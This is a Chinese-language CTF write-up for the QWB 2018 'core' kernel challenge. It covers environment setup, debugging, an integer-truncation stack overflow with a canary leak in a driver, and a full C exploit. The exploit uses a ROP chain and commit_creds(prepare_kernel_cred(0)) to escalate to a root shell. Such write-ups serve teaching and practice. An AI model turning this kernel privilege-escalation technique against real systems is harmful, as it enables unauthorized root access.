---
title: qwb2018_core
date: 2022-02-08 16:14:32
permalink: /pages/3387f7/
categories:
  - ctf_wp
  - qwb
tags:
  - 
---
# qwb 2018 core

[[toc]]

年轻人的第一个内核题目。

## 环境搭建

### 基础

解包: 

```shell
# /bin/sh

mv core.cpio core/core.cpio.gz
cd core
gunzip core.cpio.gz
cpio -idm < core.cpio
rm core.cpio
```

重打包:

```shell
# /bin/sh
find . -print0 \
| cpio --null -ov --format=newc \
| gzip -9 > core.cpio

mv core.cpio ../core.cpio
```

注意修改启动脚本，内存给的大一点才能启动

```shell
qemu-system-x86_64 \
-m 128M \
-kernel ./bzImage \
-initrd  ./core.cpio \
-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr" \
-s  \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-nographic  \

```

### 修改init脚本

由于默认是chal权限，内核地址信息等看不到，所以还要修改脚本进入root进行调试。

修改这两个位置，第一个是取消定时关机，第二个是设置默认权限为root。

![](https://s2.loli.net/2022/02/08/daxhK4AjbNMWf9E.png)

重新打包以后才生效。

### 调试

启动脚本里已经有了`-s`选项。于是可以直接使用gdb去连上去。

```
target remote :1234
```

在内核中我们使用 `lsmod`可以查看到模块加载地址，于是可以直接下断点， 进行调试。也可以使用符号， 通过以下指令载入符号即可。

```
add-symbol-file module_path base_address
```

因为基本是在驱动模块的漏洞利用，这样也差不多了。



## 漏洞

从文件中拖出来 `core.ko`文件，逆向， 可以看到通过ioctl如何操作。

![](https://s2.loli.net/2022/02/08/hWPbtKDkcTXufyz.png)

### 整数截断-栈溢出

这个位置存在一个整数截断导致的栈溢出。

![](https://s2.loli.net/2022/02/08/rcke7fmy9pnMzQK.png)

而name这个数据在这个位置， 我们可以通过write直接写入。

![image.png](https://s2.loli.net/2022/02/08/Faz5NUhtLpJuS9Z.png)

### 数据泄漏

这里可以向用户态写入数据，

![image.png](https://s2.loli.net/2022/02/08/JvpqXcYfkwloL1m.png)

通过ioctl可以直接修改这个off， 

![image.png](https://s2.loli.net/2022/02/08/zebUdc3mw86CtGL.png)

## 利用

利用也比较简单，

![image.png](https://s2.loli.net/2022/02/08/oPNI4YdaAguL9Jp.png)

程序内有canary， 运行有kaslr， 于是我们要先泄漏canary、内核地址、驱动地址。

```c
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>

int fd;
typedef unsigned long long  uint64;

uint64 user_cs, user_ss, user_rsp, eflags;
void save_stats(){
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        :"=r" (user_cs) , "=r"(user_ss), "=r"(user_rsp), "=r"(eflags)
        : 
        :"memory"
        );
}



void core_read(char * buf){
    ioctl(fd, 0x6677889B, buf);
}

void setoff(int off){
    ioctl(fd, 0x6677889C, off);
}
void copy_func(uint64 size){
    ioctl(fd, 0x6677889A, size);
}

void get_shell(){
    system("/bin/sh");
}


#define KERNCALL __attribute__((regparm(3)))
void* (*prepare_kernel_cred)(void*) KERNCALL ;
void (*commit_creds)(void*) KERNCALL ;
void get_root(){
      commit_creds(prepare_kernel_cred(0));
}

int main(){
    save_stats();
    fd = open("/proc/core", O_RDWR);
    if (fd == -1){
        printf("open file error!\n");
        exit(-1);
    }else {
        printf("open file success!\n");
    }

    uint64 buf[0x40 / 8];
    memset(buf, 0, 0x40);
    setoff(0x40);
    core_read(buf);
    // off=0x40 -> canary
    // off=0x50 -> core_base
    uint64 canary = buf[0];
    uint64 core_base = buf[2] - 0x19b;
    uint64 vm_base = buf[4] - 0x1dd6d1;
    printf("[*] cancry: %p\n", canary);
    printf("[*] core_base: %p\n", core_base);
    printf("[*] vm_base: %p\n", vm_base);

    uint64 swapgs = core_base + 0x00000000000000D6;
    uint64 iretq  = vm_base + 0x50ac2;

    commit_creds = vm_base + 0x9c8e0;
    prepare_kernel_cred = vm_base + 0x9cce0;

    uint64 pop_rid = vm_base + 0xb2f;
    uint64 pop_rcx = vm_base + 0x21e53;
    uint64 mov_rdi_rax_jmp_rcx = vm_base + 0x1ae978;


    uint64 rop[0x100/8];
    memset(rop, 0, 0x40);
    int i = 8;
    rop[i++] = canary;
    rop[i++] = 0;
    // to root

// rop
//    rop[i++] = pop_rid;
//    rop[i++] = 0;
//    rop[i++] = prepare_kernel_cred;
//    rop[i++] = pop_rbp;
//    rop[i++] = commit_creds;
//    rop[i++] = mov_rdi_rax_jmp_rcx;
    rop[i++] = get_root;

    // reture to user
    rop[i++] = swapgs;
    rop[i++] = 0;
    rop[i++] = iretq;
    rop[i++] = (uint64)get_shell;
    rop[i++] = user_cs;
    rop[i++] = eflags;
    rop[i++] = user_rsp;
    rop[i++] = user_ss;

    write(fd, rop, 0x100 );
    copy_func(0x100 | 0xFFFFFFFFFFFF0000);
}
```

